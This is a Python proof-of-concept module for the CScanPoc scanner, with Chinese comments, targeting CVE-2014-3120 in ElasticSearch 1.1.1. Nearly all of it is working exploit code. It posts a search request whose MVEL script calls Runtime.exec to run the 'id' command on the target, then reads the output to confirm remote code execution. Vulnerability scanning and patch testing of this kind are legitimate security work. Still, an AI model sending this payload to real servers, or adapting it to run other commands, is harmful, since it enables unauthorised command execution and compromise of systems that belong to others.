# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import json

class Vuln(ABVuln):
    vuln_id = 'ElasticSearch_0001'  # 平台漏洞编号，留空
    name = 'ElasticSearch 命令执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-05-14'  # 漏洞公布时间
    desc = '''
        ElasticSearch用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'CVE-2014-3120'  # cve编号
    product = 'ElasticSearch'  # 漏洞应用名称
    product_version = 'v1.1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '92fe92e5-0b06-43c7-b990-8cafb7d640d5'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            data1 = '''{"name": "csancsan"}'''
            r1 = requests.post('{target}/website/blog/'.format(target=self.target), data=data1)

            head = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json'
            }
            payload = {  
            "size": 1,
                "query": {
                  "filtered": {
                    "query": {
                      "match_all": {
                      }
                    }
                  }
                },
                "script_fields": {
                    "command": {
                        "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                    }
                }
            } 
            r2 = requests.post('{target}/_search?pretty'.format(target=self.target), headers=head, data=json.dumps(payload))
            #print(r2.text)
            if 'uid' in r2.text and 'gid' in r2.text and 'groups' in r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
